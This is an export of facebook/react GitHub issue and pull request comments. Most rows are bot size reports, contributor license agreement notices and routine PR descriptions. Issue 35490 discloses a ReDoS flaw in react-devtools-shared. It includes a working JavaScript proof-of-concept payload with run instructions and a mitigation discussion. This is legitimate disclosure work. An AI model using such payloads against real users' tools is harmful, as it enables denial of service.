Repository,Issue/PR Number,Type,Author,Date,Comment Body,URL
facebook/react,35498,Pull Request,react-sizebot,2026-01-12 21:49:07+00:00,"
<!--
  0 failure: 
  0 warning: 
  
  1 markdown notices
  DangerID: danger-id-stable;
-->




Comparing: 4a3d993e52fd6bcadd9c3029c75df3c22684f69c...ba8792bdd7610463cf4d12135e9274d149abe4ae

## Critical size changes

Includes critical production bundles, as well as any change greater than 2%:


  | Name | +/- | Base | Current | +/- gzip | Base gzip | Current gzip |
  | ---- | --- | ---- | ------- | -------- | --------- | ------------ |
| [oss-stable/react-dom/cjs/react-dom.production.js](https://react-builds.vercel.app/commits/ba8792bdd7610463cf4d12135e9274d149abe4ae/files/oss-stable/react-dom/cjs/react-dom.production.js?compare=4a3d993e52fd6bcadd9c3029c75df3c22684f69c) | **=** | 6.84 kB | 6.84 kB | +0.11% | 1.88 kB | 1.88 kB
| [oss-stable/react-dom/cjs/react-dom-client.production.js](https://react-builds.vercel.app/commits/ba8792bdd7610463cf4d12135e9274d149abe4ae/files/oss-stable/react-dom/cjs/react-dom-client.production.js?compare=4a3d993e52fd6bcadd9c3029c75df3c22684f69c) | **=** | 608.03 kB | 608.03 kB | = | 107.61 kB | 107.61 kB
| [oss-experimental/react-dom/cjs/react-dom.production.js](https://react-builds.vercel.app/commits/ba8792bdd7610463cf4d12135e9274d149abe4ae/files/oss-experimental/react-dom/cjs/react-dom.production.js?compare=4a3d993e52fd6bcadd9c3029c75df3c22684f69c) | **=** | 6.84 kB | 6.84 kB | +0.05% | 1.88 kB | 1.88 kB
| [oss-experimental/react-dom/cjs/react-dom-client.production.js](https://react-builds.vercel.app/commits/ba8792bdd7610463cf4d12135e9274d149abe4ae/files/oss-experimental/react-dom/cjs/react-dom-client.production.js?compare=4a3d993e52fd6bcadd9c3029c75df3c22684f69c) | **=** | 667.26 kB | 667.26 kB | = | 117.51 kB | 117.51 kB
| [facebook-www/ReactDOM-prod.classic.js](https://react-builds.vercel.app/commits/ba8792bdd7610463cf4d12135e9274d149abe4ae/files/facebook-www/ReactDOM-prod.classic.js?compare=4a3d993e52fd6bcadd9c3029c75df3c22684f69c) | **=** | 693.38 kB | 693.38 kB | = | 122.00 kB | 122.00 kB
| [facebook-www/ReactDOM-prod.modern.js](https://react-builds.vercel.app/commits/ba8792bdd7610463cf4d12135e9274d149abe4ae/files/facebook-www/ReactDOM-prod.modern.js?compare=4a3d993e52fd6bcadd9c3029c75df3c22684f69c) | **=** | 683.76 kB | 683.76 kB | = | 120.40 kB | 120.40 kB

## Significant size changes

Includes any change greater than 0.2%:

(No significant changes)

<p align=""right"">
  Generated by :no_entry_sign: <a href=""https://danger.systems/js"">dangerJS</a> against ba8792bdd7610463cf4d12135e9274d149abe4ae
</p>
",https://github.com/facebook/react/pull/35498#issuecomment-3740653330
facebook/react,35497,Pull Request,rickhanlonii,2026-01-12 21:44:31+00:00,"Requires full error message in assert helpers. 

Some of the error messages we asset on add a native javascript stack trace, which would be a pain to add to the messages and maintain. This PR allows you to just add `\n    in <stack>` placeholder to the error message to denote a native stack trace is present in the message.

---
Note: i vibe coded this so it was a pain to backtrack this to break this into a stack, I tried and gave up, sorry.",https://github.com/facebook/react/pull/35497
facebook/react,35497,Pull Request,react-sizebot,2026-01-12 21:48:02+00:00,"
<!--
  0 failure: 
  0 warning: 
  
  1 markdown notices
  DangerID: danger-id-stable;
-->




Comparing: 5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea...e61f35238427fe09be404727739b05eb876b3b01

## Critical size changes

Includes critical production bundles, as well as any change greater than 2%:


  | Name | +/- | Base | Current | +/- gzip | Base gzip | Current gzip |
  | ---- | --- | ---- | ------- | -------- | --------- | ------------ |
| [oss-stable/react-dom/cjs/react-dom.production.js](https://react-builds.vercel.app/commits/e61f35238427fe09be404727739b05eb876b3b01/files/oss-stable/react-dom/cjs/react-dom.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 6.84 kB | 6.84 kB | +0.05% | 1.88 kB | 1.88 kB
| [oss-stable/react-dom/cjs/react-dom-client.production.js](https://react-builds.vercel.app/commits/e61f35238427fe09be404727739b05eb876b3b01/files/oss-stable/react-dom/cjs/react-dom-client.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 607.60 kB | 607.60 kB | = | 107.53 kB | 107.53 kB
| [oss-experimental/react-dom/cjs/react-dom.production.js](https://react-builds.vercel.app/commits/e61f35238427fe09be404727739b05eb876b3b01/files/oss-experimental/react-dom/cjs/react-dom.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 6.84 kB | 6.84 kB | +0.05% | 1.88 kB | 1.88 kB
| [oss-experimental/react-dom/cjs/react-dom-client.production.js](https://react-builds.vercel.app/commits/e61f35238427fe09be404727739b05eb876b3b01/files/oss-experimental/react-dom/cjs/react-dom-client.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 666.83 kB | 666.83 kB | = | 117.42 kB | 117.42 kB
| [facebook-www/ReactDOM-prod.classic.js](https://react-builds.vercel.app/commits/e61f35238427fe09be404727739b05eb876b3b01/files/facebook-www/ReactDOM-prod.classic.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 692.91 kB | 692.91 kB | = | 121.92 kB | 121.92 kB
| [facebook-www/ReactDOM-prod.modern.js](https://react-builds.vercel.app/commits/e61f35238427fe09be404727739b05eb876b3b01/files/facebook-www/ReactDOM-prod.modern.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 683.34 kB | 683.34 kB | = | 120.31 kB | 120.31 kB

## Significant size changes

Includes any change greater than 0.2%:

(No significant changes)

<p align=""right"">
  Generated by :no_entry_sign: <a href=""https://danger.systems/js"">dangerJS</a> against e61f35238427fe09be404727739b05eb876b3b01
</p>
",https://github.com/facebook/react/pull/35497#issuecomment-3740648253
facebook/react,35496,Pull Request,rickhanlonii,2026-01-12 21:41:22+00:00,"Stacked on https://github.com/facebook/react/pull/35495

-----

Some of the error messages we asset on add a native javascript stack trace, which would be a pain to add to the messages and maintain. This PR allows you to just add `\n    in <stack> placeholder` to the error message to denote a native stack trace is present in the message. 

Note: it was a pain to break this into a stack so the actual impl in consoleMock has some unrelated changes. I'd probably just review the tests for this diff and ignore the changes, I plan on simplifying it and cleaning it up in a later PR.",https://github.com/facebook/react/pull/35496
facebook/react,35496,Pull Request,react-sizebot,2026-01-12 21:44:37+00:00,"
<!--
  0 failure: 
  0 warning: 
  
  1 markdown notices
  DangerID: danger-id-stable;
-->




Comparing: 5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea...f87b7d05a091ae6cffd860b34f66abaa3a550dd9

## Critical size changes

Includes critical production bundles, as well as any change greater than 2%:


  | Name | +/- | Base | Current | +/- gzip | Base gzip | Current gzip |
  | ---- | --- | ---- | ------- | -------- | --------- | ------------ |
| [oss-stable/react-dom/cjs/react-dom.production.js](https://react-builds.vercel.app/commits/f87b7d05a091ae6cffd860b34f66abaa3a550dd9/files/oss-stable/react-dom/cjs/react-dom.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 6.84 kB | 6.84 kB | +0.16% | 1.88 kB | 1.88 kB
| [oss-stable/react-dom/cjs/react-dom-client.production.js](https://react-builds.vercel.app/commits/f87b7d05a091ae6cffd860b34f66abaa3a550dd9/files/oss-stable/react-dom/cjs/react-dom-client.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 607.60 kB | 607.60 kB | = | 107.53 kB | 107.54 kB
| [oss-experimental/react-dom/cjs/react-dom.production.js](https://react-builds.vercel.app/commits/f87b7d05a091ae6cffd860b34f66abaa3a550dd9/files/oss-experimental/react-dom/cjs/react-dom.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 6.84 kB | 6.84 kB | +0.11% | 1.88 kB | 1.88 kB
| [oss-experimental/react-dom/cjs/react-dom-client.production.js](https://react-builds.vercel.app/commits/f87b7d05a091ae6cffd860b34f66abaa3a550dd9/files/oss-experimental/react-dom/cjs/react-dom-client.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 666.83 kB | 666.83 kB | = | 117.42 kB | 117.42 kB
| [facebook-www/ReactDOM-prod.classic.js](https://react-builds.vercel.app/commits/f87b7d05a091ae6cffd860b34f66abaa3a550dd9/files/facebook-www/ReactDOM-prod.classic.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 692.91 kB | 692.91 kB | = | 121.92 kB | 121.92 kB
| [facebook-www/ReactDOM-prod.modern.js](https://react-builds.vercel.app/commits/f87b7d05a091ae6cffd860b34f66abaa3a550dd9/files/facebook-www/ReactDOM-prod.modern.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 683.34 kB | 683.34 kB | = | 120.31 kB | 120.31 kB

## Significant size changes

Includes any change greater than 0.2%:

(No significant changes)

<p align=""right"">
  Generated by :no_entry_sign: <a href=""https://danger.systems/js"">dangerJS</a> against f87b7d05a091ae6cffd860b34f66abaa3a550dd9
</p>
",https://github.com/facebook/react/pull/35496#issuecomment-3740628760
facebook/react,35496,Pull Request,rickhanlonii,2026-01-12 22:54:15+00:00,"yeah i'm not fucking with a stack on this anymore, merging into https://github.com/facebook/react/pull/35497",https://github.com/facebook/react/pull/35496#issuecomment-3740878701
facebook/react,35495,Pull Request,rickhanlonii,2026-01-12 21:37:11+00:00,"Adds component stacks to the messages missing them, so we can match on exact error message",https://github.com/facebook/react/pull/35495
facebook/react,35495,Pull Request,react-sizebot,2026-01-12 21:40:41+00:00,"
<!--
  0 failure: 
  0 warning: 
  
  1 markdown notices
  DangerID: danger-id-stable;
-->




Comparing: 5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea...6e8deb02b12d7a0b7060ee56a2a7d6540c093a28

## Critical size changes

Includes critical production bundles, as well as any change greater than 2%:


  | Name | +/- | Base | Current | +/- gzip | Base gzip | Current gzip |
  | ---- | --- | ---- | ------- | -------- | --------- | ------------ |
| [oss-stable/react-dom/cjs/react-dom.production.js](https://react-builds.vercel.app/commits/6e8deb02b12d7a0b7060ee56a2a7d6540c093a28/files/oss-stable/react-dom/cjs/react-dom.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 6.84 kB | 6.84 kB | +0.05% | 1.88 kB | 1.88 kB
| [oss-stable/react-dom/cjs/react-dom-client.production.js](https://react-builds.vercel.app/commits/6e8deb02b12d7a0b7060ee56a2a7d6540c093a28/files/oss-stable/react-dom/cjs/react-dom-client.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 607.60 kB | 607.60 kB | = | 107.53 kB | 107.53 kB
| [oss-experimental/react-dom/cjs/react-dom.production.js](https://react-builds.vercel.app/commits/6e8deb02b12d7a0b7060ee56a2a7d6540c093a28/files/oss-experimental/react-dom/cjs/react-dom.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 6.84 kB | 6.84 kB | = | 1.88 kB | 1.88 kB
| [oss-experimental/react-dom/cjs/react-dom-client.production.js](https://react-builds.vercel.app/commits/6e8deb02b12d7a0b7060ee56a2a7d6540c093a28/files/oss-experimental/react-dom/cjs/react-dom-client.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 666.83 kB | 666.83 kB | = | 117.42 kB | 117.42 kB
| [facebook-www/ReactDOM-prod.classic.js](https://react-builds.vercel.app/commits/6e8deb02b12d7a0b7060ee56a2a7d6540c093a28/files/facebook-www/ReactDOM-prod.classic.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 692.91 kB | 692.91 kB | = | 121.92 kB | 121.92 kB
| [facebook-www/ReactDOM-prod.modern.js](https://react-builds.vercel.app/commits/6e8deb02b12d7a0b7060ee56a2a7d6540c093a28/files/facebook-www/ReactDOM-prod.modern.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 683.34 kB | 683.34 kB | = | 120.31 kB | 120.31 kB

## Significant size changes

Includes any change greater than 0.2%:

(No significant changes)

<p align=""right"">
  Generated by :no_entry_sign: <a href=""https://danger.systems/js"">dangerJS</a> against 6e8deb02b12d7a0b7060ee56a2a7d6540c093a28
</p>
",https://github.com/facebook/react/pull/35495#issuecomment-3740605966
facebook/react,35495,Pull Request,rickhanlonii,2026-01-12 22:54:05+00:00,"yeah i'm not fucking with a stack on this anymore, merging into https://github.com/facebook/react/pull/35497",https://github.com/facebook/react/pull/35495#issuecomment-3740878322
facebook/react,35494,Pull Request,gnoff,2026-01-12 20:47:20+00:00,"When hydrating if something suspends and then resolves in a microtask it is possible that React will resume the render without fully unwinding work in progress. This can cause hydration cursors to be offset and lead to hydration errors. This change adds a restore step when replaying HostComponent to ensure the hydration cursor is in the appropriate position when replaying.

fixes: #35210",https://github.com/facebook/react/pull/35494
facebook/react,35494,Pull Request,react-sizebot,2026-01-12 20:50:49+00:00,"
<!--
  0 failure: 
  0 warning: 
  
  1 markdown notices
  DangerID: danger-id-stable;
-->




Comparing: 5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea...eaa592d626196e8cc4d87ef01e1ca9060d8a27dc

## Critical size changes

Includes critical production bundles, as well as any change greater than 2%:


  | Name | +/- | Base | Current | +/- gzip | Base gzip | Current gzip |
  | ---- | --- | ---- | ------- | -------- | --------- | ------------ |
| [oss-stable/react-dom/cjs/react-dom.production.js](https://react-builds.vercel.app/commits/eaa592d626196e8cc4d87ef01e1ca9060d8a27dc/files/oss-stable/react-dom/cjs/react-dom.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 6.84 kB | 6.84 kB | +0.05% | 1.88 kB | 1.88 kB
| [oss-stable/react-dom/cjs/react-dom-client.production.js](https://react-builds.vercel.app/commits/eaa592d626196e8cc4d87ef01e1ca9060d8a27dc/files/oss-stable/react-dom/cjs/react-dom-client.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **+0.05%** | 607.60 kB | 607.92 kB | +0.07% | 107.53 kB | 107.61 kB
| [oss-experimental/react-dom/cjs/react-dom.production.js](https://react-builds.vercel.app/commits/eaa592d626196e8cc4d87ef01e1ca9060d8a27dc/files/oss-experimental/react-dom/cjs/react-dom.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **=** | 6.84 kB | 6.84 kB | = | 1.88 kB | 1.88 kB
| [oss-experimental/react-dom/cjs/react-dom-client.production.js](https://react-builds.vercel.app/commits/eaa592d626196e8cc4d87ef01e1ca9060d8a27dc/files/oss-experimental/react-dom/cjs/react-dom-client.production.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **+0.05%** | 666.83 kB | 667.15 kB | +0.07% | 117.42 kB | 117.50 kB
| [facebook-www/ReactDOM-prod.classic.js](https://react-builds.vercel.app/commits/eaa592d626196e8cc4d87ef01e1ca9060d8a27dc/files/facebook-www/ReactDOM-prod.classic.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **+0.05%** | 692.91 kB | 693.27 kB | +0.06% | 121.92 kB | 122.00 kB
| [facebook-www/ReactDOM-prod.modern.js](https://react-builds.vercel.app/commits/eaa592d626196e8cc4d87ef01e1ca9060d8a27dc/files/facebook-www/ReactDOM-prod.modern.js?compare=5aec1b2a8d1bcafb43a7ddb64dc37eacad081bea) | **+0.05%** | 683.34 kB | 683.65 kB | +0.07% | 120.31 kB | 120.39 kB

## Significant size changes

Includes any change greater than 0.2%:

(No significant changes)

<p align=""right"">
  Generated by :no_entry_sign: <a href=""https://danger.systems/js"">dangerJS</a> against eaa592d626196e8cc4d87ef01e1ca9060d8a27dc
</p>
",https://github.com/facebook/react/pull/35494#issuecomment-3740435349
facebook/react,35493,Issue,lunart079-boop,2026-01-12 19:25:43+00:00,"<!--
  Please provide a clear and concise description of what the bug is. Include
  screenshots if needed. Please test using the latest version of the relevant
  React packages to make sure your issue has not already been fixed.
-->

React version:

## Steps To Reproduce

1.
2.

<!--
  Your bug will get fixed much faster if we can run your code and it doesn't
  have dependencies other than React. Issues without reproduction steps or
  code examples may be immediately closed as not actionable.
-->

Link to code example:

<!--
  Please provide a CodeSandbox (https://codesandbox.io/s/new), a link to a
  repository on GitHub, or provide a minimal code example that reproduces the
  problem. You may provide a screenshot of the application if you think it is
  relevant to your bug report. Here are some tips for providing a minimal
  example: https://stackoverflow.com/help/mcve.
-->

## The current behavior


## The expected behavior
",https://github.com/facebook/react/issues/35493
facebook/react,35492,Pull Request,rana41-hub,2026-01-12 16:24:33+00:00,"### Summary
Improves clarity and grammar of a comment explaining Fragment prop validation.

### Details
Rephrases the comment for better readability without changing any behavior.

### Testing
Not applicable (comment-only change).


<!--
  Thanks for submitting a pull request!
  We appreciate you spending the time to work on these changes. Please provide enough information so that others can review your pull request. The three fields below are mandatory.

  Before submitting a pull request, please make sure the following is done:

  1. Fork [the repository](https://github.com/facebook/react) and create your branch from `main`.
  2. Run `yarn` in the repository root.
  3. If you've fixed a bug or added code that should be tested, add tests!
  4. Ensure the test suite passes (`yarn test`). Tip: `yarn test --watch TestName` is helpful in development.
  5. Run `yarn test --prod` to test in the production environment. It supports the same options as `yarn test`.
  6. If you need a debugger, run `yarn test --debug --watch TestName`, open `chrome://inspect`, and press ""Inspect"".
  7. Format your code with [prettier](https://github.com/prettier/prettier) (`yarn prettier`).
  8. Make sure your code lints (`yarn lint`). Tip: `yarn linc` to only check changed files.
  9. Run the [Flow](https://flowtype.org/) type checks (`yarn flow`).
  10. If you haven't already, complete the CLA.

  Learn more about contributing: https://reactjs.org/docs/how-to-contribute.html
-->

## Summary

<!--
 Explain the **motivation** for making this change. What existing problem does the pull request solve?
-->

## How did you test this change?

<!--
  Demonstrate the code is solid. Example: The exact commands you ran and their output, screenshots / videos if the pull request changes the user interface.
  How exactly did you verify that your PR solves the issue you wanted to solve?
  If you leave this empty, your PR will very likely be closed.
-->
",https://github.com/facebook/react/pull/35492
facebook/react,35492,Pull Request,meta-cla[bot],2026-01-12 16:24:40+00:00,"Hi @rana41-hub! 

Thank you for your pull request and welcome to our community. 

# Action Required

In order to merge **any pull request** (code, docs, etc.), we **require** contributors to sign our **Contributor License Agreement**, and we don't seem to have one on file for you.

# Process

In order for us to review and merge your suggested changes, please sign at <https://code.facebook.com/cla>. **If you are contributing on behalf of someone else (eg your employer)**, the individual CLA may not be sufficient and your employer may need to sign the corporate CLA.

Once the CLA is signed, our tooling will perform checks and validations. Afterwards, the **pull request will be tagged** with `CLA signed`. The tagging process may take up to 1 hour after signing. Please give it that time before contacting us about it.

If you have received this in error or have any questions, please contact us at [cla@meta.com](mailto:cla@meta.com?subject=CLA%20for%20facebook%2Freact%20%2335492). Thanks!",https://github.com/facebook/react/pull/35492#issuecomment-3739405922
facebook/react,35492,Pull Request,meta-cla[bot],2026-01-12 19:21:07+00:00,Thank you for signing our Contributor License Agreement. We can now accept your code for this (and any) Meta Open Source project. Thanks!,https://github.com/facebook/react/pull/35492#issuecomment-3740127638
facebook/react,35491,Pull Request,asmitha-16,2026-01-12 15:02:42+00:00,"This PR improves the internal objectIs helper by:
- Adding a type guard before comparison
- Preventing unexpected equality across mismatched types
- Improving robustness while preserving existing behavior
",https://github.com/facebook/react/pull/35491
facebook/react,35491,Pull Request,meta-cla[bot],2026-01-12 15:02:48+00:00,"Hi @asmitha-16! 

Thank you for your pull request and welcome to our community. 

# Action Required

In order to merge **any pull request** (code, docs, etc.), we **require** contributors to sign our **Contributor License Agreement**, and we don't seem to have one on file for you.

# Process

In order for us to review and merge your suggested changes, please sign at <https://code.facebook.com/cla>. **If you are contributing on behalf of someone else (eg your employer)**, the individual CLA may not be sufficient and your employer may need to sign the corporate CLA.

Once the CLA is signed, our tooling will perform checks and validations. Afterwards, the **pull request will be tagged** with `CLA signed`. The tagging process may take up to 1 hour after signing. Please give it that time before contacting us about it.

If you have received this in error or have any questions, please contact us at [cla@meta.com](mailto:cla@meta.com?subject=CLA%20for%20facebook%2Freact%20%2335491). Thanks!",https://github.com/facebook/react/pull/35491#issuecomment-3739001933
facebook/react,35490,Issue,guiyi-he,2026-01-12 13:52:26+00:00,"### Summary
A Regular Expression Denial of Service (ReDoS) vulnerability was identified in Facebook React within the react-devtools-shared package. The issue exists in the backend/utils.js component, specifically within the regular expressions used for parsing at lines 368, 369, 381, and 417. By providing a specially crafted input string to the DevTools backend, an attacker or a malicious website being inspected can trigger catastrophic backtracking. This leads to excessive CPU consumption and causes the browser tab or the DevTools process to become unresponsive, resulting in a Denial of Service (DoS).

### Details
https://github.com/facebook/react/blob/68dbd84b61cc2504c30e19f748f59a52d331f851/packages/react-devtools-shared/src/backend/utils.js#L368
https://github.com/facebook/react/blob/68dbd84b61cc2504c30e19f748f59a52d331f851/packages/react-devtools-shared/src/backend/utils.js#L369
https://github.com/facebook/react/blob/68dbd84b61cc2504c30e19f748f59a52d331f851/packages/react-devtools-shared/src/backend/utils.js#L381
https://github.com/facebook/react/blob/68dbd84b61cc2504c30e19f748f59a52d331f851/packages/react-devtools-shared/src/backend/utils.js#L417


### PoC
PoC for `line 368`:
```js
/**
 * ReDoS PoC for regexId: 6 (Validated and Optimized)
 *
 * Target Regex: /\)+$/
 * Dataflow Path: componentStack -> split('\n') -> trim() -> replace(/^\(+/) -> SINK: replace(/\)+$/)
 * Path Constraints: Must pass Chrome stack format check
 * Data Transformations: split('\n'), trim(), replace(/^\(+/, """")
 *
 * Generated Time: 2025-12-02
 * Phase: Phase 3 - Optimized (2 iterations)
 * Status: VALIDATED SUCCESS
 *
 * === VALIDATION RESULTS ===
 * Phase 2 Result: FAILED (Not reaching target Sink)
 * Phase 3 Iterations: 2
 *
 * Iteration 1: Added ':' to suffix to satisfy path constraint (url.indexOf(':') !== -1)
 *   Result: Reached Sink but insufficient time (1.455s < 2000ms)
 *
 * Iteration 2: Increased repeatTimes from 80,000 to 200,000
 *   Result: SUCCESS - Sink execution time 9.123s (Standard A: > 2000ms)
 *
 * Final Validation Metrics:
 *   - Sink Execution Time: 9.123s
 *   - Total Execution Time: ~9.5s
 *   - Success Criteria: Standard A (> 2000ms)
 *   - Production Ready: YES
 */

import { parseSourceFromComponentStack } from './utils.js';

console.log(""[+] Constructing base attack payload..."");
console.log(""[+] Target Vulnerability: regexId 6"");
console.log(""[+] Vulnerable Regex: /\\)+$/"");

// Using vulnerability report attack components to construct base payload
const prefix = """";
const infix = "")"";
const suffix = ""◎"";
const repeatTimes = 200000;  // Iteration 2: Increased from 80000 to 200000 (1455ms -> target 2000ms)

const base_payload = prefix + infix.repeat(repeatTimes) + suffix;
console.log(`[+] Base payload length: ${base_payload.length} characters`);

console.log(""\n[+] Analyzing dataflow path constraints..."");
console.log(""[+] Source: componentStack (parameter)"");
console.log(""[+] Sink: Line 368, replace(/\\)+$/, \""\"")"");
console.log(""[+] Transformations identified:"");
console.log(""    - split('\\n'): Splits string into array"");
console.log(""    - trim(): Removes whitespace"");
console.log(""    - replace(/^\\(+/, \""\""): Removes leading parentheses"");

console.log(""\n[+] Payload adjustment analysis:"");
console.log(""    - Original suffix '◎' does not contain \\n → unaffected by split()"");
console.log(""    - Suffix is not whitespace → unaffected by trim()"");
console.log(""    - No leading '(' in payload → unaffected by replace(/^\\(+/)"");
console.log(""    - PROBLEM: extractLocation requires ':' in payload (url.indexOf(':') !== -1)"");
console.log(""    - Strategy (Iteration 1): Add ':' before suffix to satisfy constraint"");

// Add ':' to satisfy extractLocation constraint while maintaining ReDoS pattern
const final_payload = base_payload.substring(0, base_payload.length - 1) + "":◎"";
console.log(`[+] Final payload length: ${final_payload.length} characters`);

console.log(""\n[!] Preparing to trigger ReDoS vulnerability..."");
console.log(`[!] Calling: parseSourceFromComponentStack(final_payload)`);

console.time(""ReDoS-Attack-Time"");
try {
    parseSourceFromComponentStack(final_payload);
    console.log(""\n[+] Function execution completed"");
} catch (e) {
    console.log(""\n[!] Function threw exception:"", e.message);
}
console.timeEnd(""ReDoS-Attack-Time"");

console.log(""\n[+] Attack completed. If execution time significantly increased, ReDoS attack was successful."");
console.log(""\n[Note] This is the initial version of the PoC and requires actual verification in Phase 2."");

/* How to use:
 * 1.Download the file:https://github.com/facebook/react/blob/68dbd84b61cc2504c30e19f748f59a52d331f851/packages/react-devtools-shared/src/backend/utils.js#L368
 * 2.Put poc.js and utils.js in the same folder
 * 3.Enter the command in the terminal: node poc.js
 * 4.You will now see a long ReDoS-Attack-Time and high CPU usage, indicating that a ReDoS attack has occurred.
*/
```
PoC for `line 369`:
```js
/**
 * ReDoS PoC for r",https://github.com/facebook/react/issues/35490
facebook/react,35490,Issue,Jitterx69,2026-01-12 14:24:02+00:00,"Hey @guiyi-he, is this issue resolved or still exists. I can solve this issue. Revert me back ASAP with confirmation. 

And here is what i found weird in this : 

1. Nested regex patterns are causing catastrophic backtracking on malformed stack traces. Try to rewrite the regexes to eliminate nested quantifiers otherwise replace them with deterministic parsing logic.

2. DevTools assumes stack trace input is trusted, allowing malicious pages to supply adversarial strings. You can treat all inspected-page data as untrusted and validate. 

3. Regex is misused as a structural parser for multi-format stack traces. Replace the current regex-based parsing with explicit tokenization or state-machine parsers.

4. No upper bound on stack trace or component name length enables resource exhaustion. You can enforce strict maximum input length limits before any regex execution.

5. There are many failure paths in regex ($, optional groups) trigger exponential backtracking on non-matching input. If possible refactor patterns to fail fast or pre-check format validity before applying regex.

6. JavaScript backtracking regex engine (V8) is vulnerable to worst-case complexity attacks. For an safer alternative, opt for using safer-regex patterns or RE2-style alternatives where applicable.

7. DevTools code lacks ReDoS-focused testing and fuzzing coverage. Think of adding an adversarial fuzzing and worst-case performance tests for all regex handling untrusted input. 

8. Legacy regex patterns accumulated complexity without periodic safety review. Go for auditing and simplifing legacy regexes, prioritizing predictability over expressiveness at the same time. ",https://github.com/facebook/react/issues/35490#issuecomment-3738806442
facebook/react,35490,Issue,guiyi-he,2026-01-12 15:03:35+00:00,"Hi, @Jitterx69 
As far as I’ve verified, the issue still reproduces on the referenced revision (68dbd84...) using the PoCs I shared (notably the patterns around the parsing flow in react-devtools-shared/src/backend/utils.js). I haven’t yet confirmed whether this has been fixed on the latest main, so for now please treat it as unresolved.

If you’re willing to help fix it, that’d be great — feel free to open a PR. I can re-test your patch against the PoCs / worst-case inputs and confirm the performance improvement.

Your observations make sense (nested quantifiers / non-matching failure paths + untrusted inspected-page input + no length cap). I’d recommend:

adding a strict max length cap before any parsing/regex runs,

refactoring the risky patterns to fail fast or replacing them with deterministic parsing (tokenization/state machine),

adding a small ReDoS/perf regression test suite for adversarial stack traces.

Thanks again — happy to coordinate on validation.",https://github.com/facebook/react/issues/35490#issuecomment-3739005814
facebook/react,35490,Issue,guiyi-he,2026-01-12 15:06:19+00:00,"Please believe I have no malicious intent. The discovery of this vulnerability stemmed from a tool I've recently been developing for automating the discovery and PoC construction of ReDos vulnerabilities. My intention is not to cause attacks, but rather to reduce the workload for developers in identifying and fixing similar vulnerabilities through automation. Therefore, please forgive me for not analyzing the current major version; the issue persists in the version with the specific commit history I provided, and the impact of this vulnerability can be effectively reproduced by following the method commented below in my provided PoC.js.",https://github.com/facebook/react/issues/35490#issuecomment-3739020093
facebook/react,35490,Issue,guiyi-he,2026-01-12 15:08:42+00:00,"https://devina.io/redos-checker
You can also use this tool to confirm.",https://github.com/facebook/react/issues/35490#issuecomment-3739030716
